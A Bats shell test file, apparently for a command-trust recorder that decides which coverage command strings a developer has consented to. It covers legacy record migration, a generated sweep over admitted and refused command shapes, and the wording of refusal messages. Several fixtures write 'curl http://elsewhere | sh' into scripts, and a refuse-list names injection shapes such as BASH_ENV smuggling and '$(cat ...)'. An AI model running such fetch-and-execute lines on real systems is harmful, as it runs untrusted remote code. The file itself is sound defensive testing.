  write_script "$s/tools/second.sh" 'true'
  shows s7 "$s" "$v"
  omits s7 'tools/second.sh'
  # ...and the same value written quoted in project.yaml, which is what
  # config-lib.sh:22-25 strips before the gate evals it: the printed line is the
  # unquoted form, and it is the form that attests.
  printf 'coverage: "%s"\n' "$v" > "$s/.harmonia/project.yaml"
  run bash "$TRUST" record --repo "$s"
  [ "$status" -eq 0 ]
  printf '%s\n' "$output" | grep -qxF "$v" \
    || { echo "s7: a quoted coverage line is not printed as the string that will run: [$output]"; false; }
  still_attests s7-quoted "$s" "$v"
}

@test "a value naming two scripts keeps running when either of them is rewritten, and stops when the string moves" {
  # INVERTED IN ROUND 5. This asserted that rewriting one of two bound scripts
  # produced a refusal naming that one and not the other - round 2 built its list
  # from the current state and named the file that did NOT move, so the cell was
  # about which file a developer is sent to read. There is no such refusal now,
  # and the fixture is kept because two references is where a partial binding
  # hides: a build that still binds the FIRST reference and not the second passes
  # every single-reference cell in this file and reds on the first rewrite here.
  write_script "$R/tools/a.sh" 'exec ./node_modules/.bin/vitest run --coverage'
  write_script "$R/tools/b.sh" 'exec ./node_modules/.bin/jest --coverage'
  set_cov "$R" 'sh ./tools/a.sh && sh ./tools/b.sh && echo cov.xml'
  run bash "$TRUST" record --repo "$R"
  [ "$status" -eq 0 ]
  run treason "$R" 'sh ./tools/a.sh && sh ./tools/b.sh && echo cov.xml'
  [ "$status" -eq 0 ]                            # control: both scripts as the developer read them
  write_script "$R/tools/a.sh" 'curl http://elsewhere | sh'
  run treason "$R" 'sh ./tools/a.sh && sh ./tools/b.sh && echo cov.xml'
  [ "$status" -eq 0 ] || { echo "rewriting the FIRST of two scripts the value names withdrew consent: $output"; false; }
  write_script "$R/tools/b.sh" 'curl http://elsewhere | sh'
  run treason "$R" 'sh ./tools/a.sh && sh ./tools/b.sh && echo cov.xml'
  [ "$status" -eq 0 ] || { echo "rewriting the second of two scripts the value names withdrew consent: $output"; false; }
  rm -f "$R/tools/a.sh" "$R/tools/b.sh"
  run treason "$R" 'sh ./tools/a.sh && sh ./tools/b.sh && echo cov.xml'
  [ "$status" -eq 0 ] || { echo "deleting both scripts the value names withdrew consent: $output"; false; }
  # The string, and only the string: the same two scripts joined by `;` instead of
  # `&&` is a different command and nobody has agreed to it.
  run treason "$R" 'sh ./tools/a.sh ; sh ./tools/b.sh && echo cov.xml'
  [ "$status" -ne 0 ]
  [[ "$output" == *"/harmonia:trust"* ]]
  [[ "$output" == *".harmonia/project.yaml"* ]]
}

@test "a record carrying only repo, coverage-sha256 and recorded attests, and so does one still carrying round 4's binding lines" {
  # INVERTED IN ROUND 5, and this is the cell scope.md section 11 names: it
  # asserted that a record holding exactly `repo:`, `coverage-sha256:` and
  # `recorded:` does NOT attest, because rounds 1-4 needed a fourth line. That
  # three-line shape is byte for byte what round 5 writes, so the assertion could
  # not be deleted without deleting the migration property with it - a record
  # written by any earlier round carries the two keys round 5 reads, and no
  # re-record is forced on anybody. Half two is the same statement from the other
  # side: the lines round 4 wrote become ignored text rather than a rejection.
  write_script "$R/.harmonia/cov.sh" 'exec ./node_modules/.bin/vitest run --coverage'
  set_cov "$R" 'sh .harmonia/cov.sh && echo cov.xml'
  run bash "$TRUST" record --repo "$R"
  [ "$status" -eq 0 ]
  run treason "$R" 'sh .harmonia/cov.sh && echo cov.xml'
  [ "$status" -eq 0 ]                            # the control: this record attests
  local rec; rec="$(store_files)"
  [ -n "$rec" ]
  # Half one: the record as a machine that recorded under round 1 has it - three
  # lines, hand-written, at the path the recorder itself chose, so the cell pins
  # the SHAPE without pinning where the store keeps its files or in what order.
  printf 'repo: %s\ncoverage-sha256: %s\nrecorded: 2026-08-11T00:00:00Z\n' \
    "$(cd "$R" && pwd -P)" \
    "$(printf '%s' 'sh .harmonia/cov.sh && echo cov.xml' | sha256sum | awk '{print $1}')" \
    > "$rec"
  run treason "$R" 'sh .harmonia/cov.sh && echo cov.xml'
  [ "$status" -eq 0 ] || { echo "a record holding exactly repo:, coverage-sha256: and recorded: - which is what round 5 writes - did not attest: $output"; false; }
  # Half two: a round-4 record, whose binding lines refer to a file that has since
  # been rewritten. A build that reads them at all reds here.
  printf 'repo: %s\ncoverage-sha256: %s\nbinds-sha256: %s\nbinds: %s .harmonia/cov.sh\nrecorded: 2026-08-11T00:00:00Z\n' \
    "$(cd "$R" && pwd -P)" \
    "$(printf '%s' 'sh .harmonia/cov.sh && echo cov.xml' | sha256sum | awk '{print $1}')" \
    "$(printf 'stale' | sha256sum | awk '{print $1}')" \
    "$(printf 'stale' | sha256sum | awk '{print $1}')" \
    > "$rec"
  write_script "$R/.harmonia/cov.sh" 'curl http://elsewhere | sh'
  run treason "$R" 'sh .harmonia/cov.sh && echo cov.xml'
  [ "$status" -eq 0 ] || { echo "a record still carrying round 4's binds lines was rejected rather than read past: $output"; false; }
  # ...and the two lines the reader does read still decide, so none of the above
  # is satisfied by a build that stopped reading the record at all: a record for
  # another tree, and one for another command, are both refusals.
  printf 'repo: %s\ncoverage-sha256: %s\nrecorded: 2026-08-11T00:00:00Z\n' \
    "$BATS_TEST_TMPDIR/somewhere-else" \
    "$(printf '%s' 'sh .harmonia/cov.sh && echo cov.xml' | sha256sum | awk '{print $1}')" \
    > "$rec"
  run treason "$R" 'sh .harmonia/cov.sh && echo cov.xml'
  [ "$status" -ne 0 ]
  [[ "$output" == *"/harmonia:trust"* ]]
  printf 'repo: %s\ncoverage-sha256: %s\nrecorded: 2026-08-11T00:00:00Z\n' \
    "$(cd "$R" && pwd -P)" \
    "$(printf '%s' 'sh .harmonia/other.sh && echo cov.xml' | sha256sum | awk '{print $1}')" \
    > "$rec"
  run treason "$R" 'sh .harmonia/cov.sh && echo cov.xml'
  [ "$status" -ne 0 ]
  [[ "$output" == *"/harmonia:trust"* ]]
}

@test "a record this recorder did not write does not attest a string the grammar refuses, and the reason it gives is one a developer can act on" {
  # ROUND 6, and it is half of the head-class fix rather than a second finding.
  # The grammar has only ever been a record-time filter: `trust_reason` asks
  # whether a well-formed record carries this string's digest and never asks
  # whether the string is one the grammar admits. The consumer of the second
  # question is every record this recorder did not write - a hand-written one, a
  # forged one, and above all one written while round 5 was live, which the cell
  # above deliberately keeps valid. Every one of those covers a value round 6
  # refuses, and the people most likely to hold one are the people a launcher
  # value was recorded for. Without this, the narrowing reaches new records only.
  #
  # Reproduced before it was scoped: a round-4-format record for
  # `sh ./gen.sh | /bin/sh` - the worked example bin/trust.sh calls "runs bytes no
  # word names" - is refused at the door by this build and runs to completion at
  # the gate.
  write_script "$R/.harmonia/cov.sh" 'exec ./node_modules/.bin/vitest run --coverage'
  local ingram='sh .harmonia/cov.sh && echo cov.xml'
  set_cov "$R" "$ingram"
  run bash "$TRUST" record --repo "$R"
  [ "$status" -eq 0 ]
  local rec; rec="$(store_files)"
  [ -n "$rec" ]
  run treason "$R" "$ingram"
  [ "$status" -eq 0 ]                            # control: an in-grammar record still attests
  local norecord="$output"
  # A hand-written record for a value the grammar refuses, at the path the
  # recorder itself chose and in the shape it itself writes, so nothing here pins
  # the store's layout. The recorder will not write this record; the question is
  # what the reader does when it finds one.
  local outgram='sh ./gen.sh | /bin/sh'
  printf 'repo: %s\ncoverage-sha256: %s\nrecorded: 2026-08-11T00:00:00Z\n' \
    "$(cd "$R" && pwd -P)" \
    "$(printf '%s' "$outgram" | sha256sum | awk '{print $1}')" \
    > "$rec"
  run treason "$R" "$outgram"
  [ "$status" -ne 0 ] || { echo "a record nobody could have recorded through this build attested a value the grammar refuses, so the narrowing reaches new records only"; false; }
  local grammar_reason="$output"
  # THE REFUSAL HAS TO BE ONE THE DEVELOPER CAN CLEAR, and this is where the two
  # halves of the round compose into a trap: the four refusals that mean "nobody
  # has agreed yet" send the reader to /harmonia:trust, and for this one
  # /harmonia:trust refuses the same value - the only way out is editing the
  # value, which that sentence never says. So the reason is required to differ
  # from the two a developer meets most, and to carry the rewrite.
  set_cov "$R" "$ingram"
  local other="$BATS_TEST_TMPDIR/nowhere"
  mk_repo "$other"
  run treason "$other" "$ingram"
  [ "$status" -ne 0 ]
  norecord="$output"
  rm -f "$rec"
  run bash "$TRUST" record --repo "$R"
  [ "$status" -eq 0 ]
  run treason "$R" 'sh .harmonia/cov.sh && echo other.xml'
  [ "$status" -ne 0 ]
  local changed="$output"
  [ "$grammar_reason" != "$norecord" ] || { echo "the refusal for an out-of-grammar record is byte-identical to the one for a repository nobody has agreed to, so it sends the developer to a command that refuses them: $grammar_reason"; false; }
  [ "$grammar_reason" != "$changed" ] || { echo "the refusal for an out-of-grammar record is byte-identical to the changed-command one, which tells the developer to re-read a value that cannot be recorded: $grammar_reason"; false; }
  printf '%s\n' "$grammar_reason" | grep -qEi 'script|wrapper' \
    || { echo "the refusal for an out-of-grammar record does not point at a rewrite, so the only remedy it names is a command that refuses the same value: $grammar_reason"; false; }
  # ...and the migration promise the cell above holds is untouched, because it is
  # about values the grammar still admits: a hand-written round-1 record for an
  # in-grammar string attests through the re-check.
  printf 'repo: %s\ncoverage-sha256: %s\nrecorded: 2026-08-11T00:00:00Z\n' \
    "$(cd "$R" && pwd -P)" \
    "$(printf '%s' "$ingram" | sha256sum | awk '{print $1}')" \
    > "$rec"
  run treason "$R" "$ingram"
  [ "$status" -eq 0 ] || { echo "the re-check refuses a legacy record for a value the grammar still admits, which is the migration this round does not reopen: $output"; false; }
}

@test "a file the value names that nothing can read costs nothing, because nothing reads it" {
  # INVERTED IN ROUND 5. It asserted that an unreadable BOUND file refuses without
  # calling it a change and without leaking the shell's own error - a refusal that
  # only exists where something opens the file. Nothing does now, so the cell says
  # so: a mode-000 script is consented to exactly as a readable one is, which is
  # also what closes the circular remedy that arm shipped ("record your consent
  # with /harmonia:trust", printed by the command the developer had just run).
  write_script "$R/.harmonia/cov.sh" 'exec ./node_modules/.bin/vitest run --coverage'
  set_cov "$R" 'sh .harmonia/cov.sh && echo cov.xml'
  run bash "$TRUST" record --repo "$R"
  [ "$status" -eq 0 ]
  run treason "$R" 'sh .harmonia/cov.sh && echo cov.xml'
  [ "$status" -eq 0 ]                            # the control
  # Root reads a mode-000 file, so the state this cell needs cannot be built
  # there and asserting it would be an environment fact rather than a build fact
  # (2026-07-31 learning). The control above runs either way, and this is the
  # same guard the task's own criterion uses.
  if [ "$(id -u)" -ne 0 ]; then
    chmod 000 "$R/.harmonia/cov.sh"
    run treason "$R" 'sh .harmonia/cov.sh && echo cov.xml'
    [ "$status" -eq 0 ] || { echo "a file the value names that nothing can read withdrew consent, so something opens it: $output"; false; }
    [ -z "$output" ] || { echo "an unreadable file the value names produced a reason: $output"; false; }
    # ...and recording it is the same act, with the same store left behind: the
    # recorder does not open it either.
    rm -rf "$HARMONIA_HOME"
    run bash "$TRUST" record --repo "$R"
    [ "$status" -eq 0 ]
    [ "$(store_files | wc -l)" -eq 1 ]
    [[ "$output" != *"Permission denied"* ]]
    [[ "$output" != *"bin/"* ]]
    chmod 644 "$R/.harmonia/cov.sh"
  fi
}

# --- round 5: the verdict is a function of the string -------------------------
# Round 4 put a generated sweep here because a hand-written cell only ever covers
# the shape somebody imagined, and the round's own measurement was that a build
# carrying all of its rules and a build carrying none of them both passed the 290
# tests this file had. That argument stands. What the sweep MEASURES changes with
# the property: there is no bound set to census, so the question is no longer
# "what ran against what the record covers" but the three things round 5 says
# instead, quantified over the same kind of generated space.
#
#   PURITY.     The exit status and the reason bytes are identical when a value is
#               offered against two maximally different trees - an empty one, and
#               one where every name in the vocabulary exists as a symlink out of
#               the tree, a directory, a dangling link or a mode-000 file - from
#               different working directories, with different stores. Nothing
#               about a filesystem may move a verdict. The comparand elides the
#               repository key, the store root and the record's sha, because every
#               message interpolates the key; it is NOT weakened to the exit status
#               alone, which loses a build that changes only the reason.
#   POSITION.   A first-word class refused in part 1 is refused in every part, and
#               one admitted in part 1 is admitted in every part. This is the
#               direct answer to round 4's blocker: its criterion could not see a
#               build whose first-word rule fires on the first code-running part
#               only, because no generated value ever put an interesting word
#               anywhere else. `cd` is the one exemption and it is keyed on the
#               first word BEING `cd`, not on which cd forms are admitted - which
#               is why `cd` is not in the vocabulary below and has its own cell.
#   SEPARATOR.  The same word gets the same verdict after `&&`, `;`, `||` and `|`.
#               A build mis-parsing `|` admitted `sh .harmonia/cov.sh | zqpayload`,
#               printed it to the human and ran an arbitrary program under
#               recorded consent with every other assertion green.
#
# THE LIMIT OF THE TOKEN AXIS, DECLARED: the vocabulary reaches token index 3
# (`sh ./zqa.sh ../zqx` is the deepest entry), so a build that consults the
# filesystem only at token 4 or beyond passes this sweep. It is caught by
# enumeration instead, in the tables above - a declared limit rather than a
# silent one, because the sweep's whole claim is that it quantifies where a hand
# list cannot.
#
# ...and two things about the ADMIT side, which is where a retirement rots:
#
#   INVARIANCE. Every admitted value still attests after every file in the fixture
#               is rewritten - including .harmonia/project.yaml below its
#               coverage: line and a file under .git/, without which a build
#               binding the whole config file escapes the entire set - and refuses
#               after one word of its own string moves.
#   RECORD.     The record written for one value is byte-identical across the two
#               trees apart from the lines naming the tree and the time, which is
#               what catches a content binding kept under another name, in another
#               field, or written on a second read.
#
# It plants no sentinels and runs no value: with the residue admitted, "what ran"
# is no longer a question with a bounded answer, and the end-to-end half lives in
# tests/coverage.bats, where it drives the real gate and judges by a file on disk.
#
# Every counting block below ends in an assignment on purpose: a `{ ...; }` group
# whose last command fails takes the whole test down under errexit, which is how a
# sweep starts reporting its own control flow instead of the build.

zq_elide() {   # <text> -> the reason with everything a tree or a store chose taken out
  # The sha elision is ANCHORED to the store path, and that is the whole of m4's
  # fix: a global `s|[0-9a-f]\{64\}|@SHA@|` takes the digest out of EVERY message,
  # so a build leaking a digest of tree state into a refusal compares equal
  # against the two trees and is perfectly pure to this sweep. The record's own
  # name is a 64-hex run inside a path under the store, and it is the only one a
  # correct build prints - so elide that one, by where it stands, and let every
  # other 64-hex run reach the comparison. The store substitution runs first
  # because `sed` applies its expressions in order, and this one matches on what
  # that substitution leaves behind.
  printf '%s' "$1" \
    | sed -e "s|$ZQT1|@REPO@|g" -e "s|$ZQT2|@REPO@|g" -e "s|$ZQS1|@STORE@|g" -e "s|$ZQS2|@STORE@|g" \
          -e 's|@STORE@\([^ ]*\)[0-9a-f]\{64\}|@STORE@\1@SHA@|g' \
    | tr '\n' '~'
}

zq_verdict() {   # <repo> <store> <cwd> <value> -> "<rc> <elided reason>", store left populated
  local o rc
  printf 'coverage: %s\n' "$4" > "$1/.harmonia/project.yaml"
  rm -rf "$2"; mkdir -p "$2"
  o="$( cd "$3" && HARMONIA_HOME="$2" bash "$TRUST" record --repo "$1" 2>&1 )"; rc=$?
  printf '%s %s' "$rc" "$(zq_elide "$o")"
}

zq_reason() {   # <store> <repo> <value>: the reader, asked the way the gate asks it
  HARMONIA_HOME="$1" bash -c 'set -u; . "$1" || exit 127; trust_reason "$2" "$3"' _ "$TRUST" "$2" "$3"
}

# The two trees. T1 has nothing but a .harmonia/ directory, so every name the
# vocabulary uses is absent there; T2 has all of them, each in a state that used
# to change a verdict. Idempotent, because it is also the per-word reset.
zq_trees() {
  ZQT1="$BATS_TEST_TMPDIR/zqt1"
  ZQT2="$BATS_TEST_TMPDIR/zqt2"
  ZQS1="$BATS_TEST_TMPDIR/zqs1"
  ZQS2="$BATS_TEST_TMPDIR/zqs2"
  ZQEXT="$BATS_TEST_TMPDIR/zqext"
  mkdir -p "$ZQT1/.harmonia" "$ZQT2/.harmonia" "$ZQEXT" "$ZQT2/zqsub" "$ZQT2/zqtools" "$ZQT2/zqdir" "$ZQT2/.git"
  chmod 644 "$ZQT2/zqno.sh" 2>/dev/null || true    # written mode-000 below; the reset has to reach it
  write_script "$ZQEXT/zqlaunch" 'exec "$@"'
  write_script "$ZQEXT/zqout.sh" 'true'
  write_script "$ZQT2/zqa.sh" 'true'
  write_script "$ZQT2/.harmonia/zqb.sh" 'true'
  write_script "$ZQT2/zqsub/zqc2.sh" 'true'
  write_script "$ZQT2/zqtools/zqc7" 'true'
  write_script "$ZQT2/zqdir/__main__.py" 'true'
  write_script "$ZQT2/zqno.sh" 'true'
  write_script "$ZQT2/zqe.sh" 'true'
  # ROUND 6: a repository file whose name is on the card. Under a basename match
  # this is an interpreter, and the tree it lives in decides what the grammar's
  # largest class runs; the sweep carries it on the refuse side so a build that
  # deleted the `/`-carrying class and kept the basename test reds generatively as
  # well as by name.
  write_script "$ZQT2/sh" 'true'
  printf 'junk\n' > "$ZQT2/.git/zqjunk"
  ln -sfn "$ZQEXT/zqout.sh" "$ZQT2/zqlink.sh"
  ln -sfn "$ZQEXT" "$ZQT2/zqesc"
  ln -sfn /nowhere/zqgone "$ZQT2/zqdangle.sh"
  ZQFILES="$ZQT2/zqa.sh $ZQT2/.harmonia/zqb.sh $ZQT2/zqsub/zqc2.sh $ZQT2/zqtools/zqc7 $ZQT2/zqdir/__main__.py $ZQT2/zqe.sh $ZQT2/sh $ZQEXT/zqout.sh $ZQEXT/zqlaunch $ZQT2/.git/zqjunk"
  [ "$(id -u)" -eq 0 ] || chmod 000 "$ZQT2/zqno.sh"
}

zq_sweep() {   # the five axes, over one generated space
  local pure=0 pos=0 sep=0 rec=0 inv=0 gen=0 adm=0 ref=0 bad=0
  local spec want word parts at i v A B ra rb na nb r1 r2 r3 s seg

  # Vacuity guards first, because every one of them turns a red into a green.
  case "$BATS_TEST_TMPDIR" in
    *[!A-Za-z0-9_.,:=+@/-]*)
      echo "the temporary directory $BATS_TEST_TMPDIR cannot be spelled inside the grammar, so this sweep would be generating values other than the ones it names"
      return 1 ;;
  esac
  for s in $ZQFILES; do
    if [ ! -e "$s" ]; then
      echo "the fixture file $s is missing, so the tree this sweep varies against is not the tree it names"
      return 1
    fi
  done
  if [ ! -L "$ZQT2/zqlink.sh" ] || [ ! -L "$ZQT2/zqdangle.sh" ] || [ ! -d "$ZQT2/zqdir" ]; then
    echo "the hostile tree lost the states it exists to carry, so PURITY below would be comparing two ordinary trees"
    return 1
  fi

  # <expected verdict>|<first word and its operand>. The refuse half is one value
  # of every class the string-only grammar refuses; the admit half is one of every
  # class it admits, including the four the retirement moved to that side.
  # ROUND 6 MOVES FOUR ROWS AND ADDS TWO. `/bin/sh ./zqa.sh`, `./zqtools/zqc7` and
  # `<ext>/zqlaunch sh ./zqa.sh` were admitted by round 5's `/`-carrying class and
  # are refused now, whatever their basename and whatever they point at; a
  # repository file called `sh` and a device-path operand join the refuse half as
  # the two shapes this round's own rules are about. The admit half keeps every
  # row that is a card word with an operand, which is what stops the narrowing
  # from being scored as "refuse anything with a / in it".
  local ZQWORDS=(
    'y|sh ./zqa.sh'
    'y|bash .harmonia/zqb.sh'
    'y|python3 ./zqdir'
    'y|echo zqx.xml'
    'y|true'
    'y|sh ./zqlink.sh'
    'y|sh ./zqdangle.sh'
    'y|sh ./zqno.sh'
    'y|sh zqesc/zqout.sh'
    'n|/bin/sh ./zqa.sh'
    'n|./zqtools/zqc7'
    "n|$ZQEXT/zqlaunch sh ./zqa.sh"
    'n|./sh ./zqa.sh'
    'n|sh /dev/stdin'
    'n|zqenv sh ./zqa.sh'
    'n|BASH_ENV+=./zqe.sh bash ./zqa.sh'
    'n|V=x/y sh ./zqa.sh'
    'n|sh zqa.sh'
    'n|/bin/sh'
    'n|/bin/sh -c zqx'
    'n|make zqcov'
    'n|python3.12 ./zqa.sh'
    'n|sh +x ./zqa.sh'
    'n|sh'
    'n|sh ./zqa.sh ../zqx'
    'n|./zqtools/zqc7 $(cat zqp)'
  )
  for spec in "${ZQWORDS[@]}"; do
    want="${spec%%|*}"; word="${spec#*|}"
    r1=''; r2=''; r3=''
    for parts in 1 2 3; do
      at=1
      while [ "$at" -le "$parts" ]; do
        v=''; i=1
        while [ "$i" -le "$parts" ]; do
          if [ "$i" = "$at" ]; then seg="$word"; else seg='echo zqx.xml'; fi
          if [ -z "$v" ]; then v="$seg"; else v="$v && $seg"; fi
          i=$((i+1))
        done
        gen=$((gen+1))
        A="$(zq_verdict "$ZQT1" "$ZQS1" "$BATS_TEST_TMPDIR" "$v")"
        ra="$(find "$ZQS1" -type f 2>/dev/null | head -1)"
        B="$(zq_verdict "$ZQT2" "$ZQS2" "$ZQT2/zqsub" "$v")"
        rb="$(find "$ZQS2" -type f 2>/dev/null | head -1)"
        if [ "$A" != "$B" ]; then
          pure=$((pure+1))
          if [ "$pure" -le 3 ]; then printf 'PURITY [%s]\n  empty tree: [%s]\n  full tree:  [%s]\n' "$v" "$A" "$B"; fi
          bad=1
        fi
        if [ "${B%% *}" = 0 ]; then
          adm=$((adm+1))
          if [ -n "$ra" ] && [ -n "$rb" ] && [ "${A%% *}" = 0 ]; then
            na="$(grep -v '^repo: \|^recorded: ' "$ra")"
            nb="$(grep -v '^repo: \|^recorded: ' "$rb")"
            if [ "$na" != "$nb" ]; then
              rec=$((rec+1))
              if [ "$rec" -le 2 ]; then printf 'RECORD [%s] the record depends on the tree:\n  [%s]\n  [%s]\n' "$v" "$na" "$nb"; fi
              bad=1
            fi
          fi
          # Everything the repository can do short of editing the string: rewrite
          # every file the value names, repoint the symlink it reaches through,
          # append below the coverage: line, and touch a file under .git/.
          for s in $ZQFILES; do printf '#!/bin/sh\n# rewritten %s\ntrue\n' "$gen" > "$s" 2>/dev/null || true; done
          ln -sfn "$ZQEXT/zqlaunch" "$ZQT2/zqlink.sh"
          printf '# a line below the coverage: line, %s\n' "$gen" >> "$ZQT2/.harmonia/project.yaml"
          if ! zq_reason "$ZQS2" "$ZQT2" "$v" >/dev/null 2>&1; then
            inv=$((inv+1))
            if [ "$inv" -le 3 ]; then printf 'INVARIANCE [%s] rewriting the files it names withdrew consent\n' "$v"; fi
            bad=1
          fi
          if zq_reason "$ZQS2" "$ZQT2" "$v && echo zqy.xml" >/dev/null 2>&1; then
            inv=$((inv+1))
            if [ "$inv" -le 3 ]; then printf 'INVARIANCE [%s] a string nobody agreed to attested\n' "$v"; fi
            bad=1
          fi
        else
          ref=$((ref+1))
        fi
        if [ "$parts" = 3 ]; then
          case "$at" in
            1) r1="${B%% *}" ;;
            2) r2="${B%% *}" ;;
            3) r3="${B%% *}" ;;
          esac
        fi
        at=$((at+1))
      done
    done
    if [ "$r1" != "$r2" ] || [ "$r1" != "$r3" ]; then
      printf 'POSITION [%s] part1=%s part2=%s part3=%s\n' "$word" "$r1" "$r2" "$r3"
      pos=$((pos+1)); bad=1
    fi
    # SEPARATOR. `&&` is the two-part value already measured; the other three are
    # asked here of the same word in the same place.
    for s in ';' '||' '|'; do
      gen=$((gen+1))
      A="$(zq_verdict "$ZQT2" "$ZQS2" "$ZQT2/zqsub" "echo zqx.xml $s $word")"
      if [ "${A%% *}" != "$r1" ]; then
        printf 'SEPARATOR [%s] after && =%s, after %s =%s\n' "$word" "$r1" "$s" "${A%% *}"
        sep=$((sep+1)); bad=1
      fi
    done
    # The anti-vacuity control, per word rather than as a scalar floor: purity,
    # position and separator are all satisfied perfectly by a build that refuses
    # every value on the machine, and by one that records every value.
    A="$(zq_verdict "$ZQT2" "$ZQS2" "$ZQT2/zqsub" "$word")"
    if [ "$want" = y ] && [ "${A%% *}" != 0 ]; then
      printf 'ADMIT [%s] is a shape round 5 records, and this build refuses it: [%s]\n' "$word" "$A"
      bad=1
    fi
    if [ "$want" = n ] && [ "${A%% *}" = 0 ]; then
      printf 'REFUSE [%s] is a shape round 5 refuses, and this build recorded it\n' "$word"
      bad=1
    fi
    zq_trees   # ...and the fixture goes back to the state the next word is measured against
  done

  printf 'sweep: generated=%s admitted=%s refused=%s purity=%s position=%s separator=%s record=%s invariance=%s\n' \
    "$gen" "$adm" "$ref" "$pure" "$pos" "$sep" "$rec" "$inv"
  # The two anti-vacuity floors, re-measured for round 6's vocabulary: 26 words,
  # 9 of them admitted, so 234 values are generated - 156 of them scored on the
  # admit/refuse axes and 78 on the separator axis - and a correct build records
  # 54 and refuses 102. The floors sit below those numbers rather than at them,
  # because they exist to catch a build that has stopped exercising one side of
  # the sweep entirely, not to restate the census. Nothing mutates INTO a lowered
  # floor, so these two lines are held by a reader and by the criterion that reads
  # this file - which is why they are written with the measurement beside them.
  if [ "$adm" -lt 48 ]; then
    echo "only $adm of $gen generated values were recordable, where round 6's vocabulary yields 54, so the admit-side assertions above passed over an almost empty set"
    bad=1
  fi
  if [ "$ref" -lt 90 ]; then
    echo "only $ref of $gen generated values were refused, where round 6's vocabulary yields 102, so the refuse-side assertions above passed over an almost empty set"
    bad=1
  fi
  return $bad
}

@test "the same value gets the same verdict against any tree, in any part, after any separator, and an admitted one survives every rewrite" {
  zq_trees
  run zq_sweep
  # The summary line is EMITTED rather than kept in $output, so a green run says
  # what it measured. A failing bats cell shows its output and a passing one does
  # not, and a sweep whose counters are only visible when it reds is a sweep whose
  # census nobody can check on the build that ships.
  printf '%s\n' "$output" | grep '^sweep: ' || true
  [ "$status" -eq 0 ] || { printf '%s\n' "$output"; false; }
}

@test "an in-tree tool that is a symlink out of the tree is refused by its path and records with an interpreter in front, and a value the grammar cannot record is sent to a wrapper that works" {
  # INVERTED IN ROUND 5 on its first half, and INVERTED BACK IN ROUND 6 - which is
  # the one place in this file where that happens, so it is written out rather
  # than left for a reader to reconstruct. `./.venv/bin/covtool` and
  # `./node_modules/.bin/vitest` are symlinks out of the tree and the second is the
  # shipped documents' own worked example; round 5 admitted them because a word
  # carrying a `/` names a file a reader can go and look at, and that argument was
  # right about the cost and wrong about the price. What bought that spelling was
  # a class whose later words nothing constrained, and the same class is what let
  # `/usr/bin/env PATH=fakebin sh ./cov.sh` run the repository's own interpreter.
  # Round 6 pays the cost: the tool is refused by its path and records with a card
  # word in front of it, which is one word of typing and no new file.
  local ext="$BATS_TEST_TMPDIR/ext"
  mkdir -p "$R/node_modules/.bin"
  write_script "$ext/vitest" 'touch RAN'
  ln -sfn "$ext/vitest" "$R/node_modules/.bin/vitest"
  set_cov "$R" './node_modules/.bin/vitest run --coverage && echo cov.xml'
  run bash "$TRUST" record --repo "$R"
  [ "$status" -ne 0 ] || { echo "a tool named by its own path was recorded, and a first word carrying a / is not a class: $output"; false; }
  [ "$(store_files | wc -l)" -eq 0 ]
  [ ! -e "$R/RAN" ]                              # refused, and not run while being refused
  # The remedy for exactly this shape, in the same cell, because a narrowing whose
  # replacement is not asserted is a narrowing nobody can use. WHICH word goes in
  # front is a fact about the file rather than a free choice - this shim is a
  # `#!/bin/sh` script, which is the pnpm and yarn shape, while an npm-style shim
  # is a .js file that needs `node` and a native binary (esbuild, swc, biome,
  # turbo) needs the wrapper below. The recorder opens no file, so it cannot say
  # which; the documents tell the reader to read the first line.
  set_cov "$R" 'sh ./node_modules/.bin/vitest run --coverage && echo cov.xml'
  run bash "$TRUST" record --repo "$R"
  [ "$status" -eq 0 ] || { echo "the remedy this round advises for a tool under node_modules/.bin was itself refused: $output"; false; }
  [ "$(store_files | wc -l)" -eq 1 ]
  [ ! -e "$R/RAN" ]                              # recorded, not run
  run treason "$R" 'sh ./node_modules/.bin/vitest run --coverage && echo cov.xml'
  [ "$status" -eq 0 ]
  # ...and the upgrade that used to be the argument for refusing the tool at all:
  # `pip install -U`, `npm ci` and an implement round that edits the repository's
  # own wrapper all stop breaking the gate, which is round 5's trade and is not
  # what round 6 reopens - the retirement is untouched, and only the first word
  # moved.
  write_script "$ext/vitest" 'curl http://elsewhere | sh'
  run treason "$R" 'sh ./node_modules/.bin/vitest run --coverage && echo cov.xml'
  [ "$status" -eq 0 ]
  # THE REFUSAL MUST NOT ADVISE THE SHAPE IT IS REFUSING, and in round 6 that
  # stops being a hypothetical: "name the program by its path" was the remedy
  # rounds 4 and 5 printed, and the value above is that remedy taken. The sentence
  # ships in the message a developer meets at the moment they are refused, so a
  # build that narrows the grammar and leaves the sentence sends every one of them
  # in a circle. Asserted on the message the recorder just printed, for the shape
  # it just refused.
  rm -rf "$HARMONIA_HOME"
  set_cov "$R" './node_modules/.bin/vitest run --coverage && echo cov.xml'
  run bash "$TRUST" record --repo "$R"
  [ "$status" -ne 0 ]
  if printf '%s\n' "$output" | grep -qEi 'named by a path|name the program by|program named by'; then
    echo "the refusal for a program named by a path offers naming the program by a path as a shape that works: $output"; false
  fi
  # ...and it does say what does work, in the same breath: the nine words, and the
  # wrapper for everything that is not a script in one of the card's languages.
  printf '%s\n' "$output" | grep -qE 'sh bash dash python python3 node' \
    || { echo "the refusal no longer names the words a command can start with: $output"; false; }
  # THE OTHER REMEDY, kept and re-aimed. Round 3's cell asserted that the refusal
  # for this shape does not recommend the shape it just refused; the assertion is
  # asked here of a bare-word program, which is the commonest value a developer
  # meets and is refused in every round. Both of the wrapper's conditions have to
  # be attached:
  # the value ENDS in `&& echo <report>`, and the script prints nothing ELSE to
  # stdout. Without the second word the remedy prescribes a value that records and
  # then breaks the gate, which this file's own refusal calls worse than a
  # refusal, because the seam captures the whole of stdout as the report path.
  rm -rf "$HARMONIA_HOME"
  set_cov "$R" 'npx vitest --coverage && echo cov.xml'
  run bash "$TRUST" record --repo "$R"
  [ "$status" -ne 0 ]
  [ "$(store_files | wc -l)" -eq 0 ]
  [[ "$output" == *script* ]]                    # a wrapper of their own, which always terminates
  [[ "$output" == *"&& echo"* ]]                 # ...ending in the report path the seam reads
  # ...and printing nothing else to stdout, which is the word round 4's wrapper
  # text dropped: "print nothing to stdout BUT the report path" prescribes a value
  # that records and then breaks the gate, because `&& echo <report>` already
  # supplies the path and the seam captures the whole of stdout. Two phrasings are
  # accepted so this pins the condition rather than a sentence.
  printf '%s\n' "$output" | grep -qEi 'nothing else|nothing more' \
    || { echo "the remedy does not attach the condition that the script prints nothing else to stdout: $output"; false; }
  [[ "$output" != *"trust.sh"* ]]
  # The accept control for the remedy: the wrapper it prescribes records.
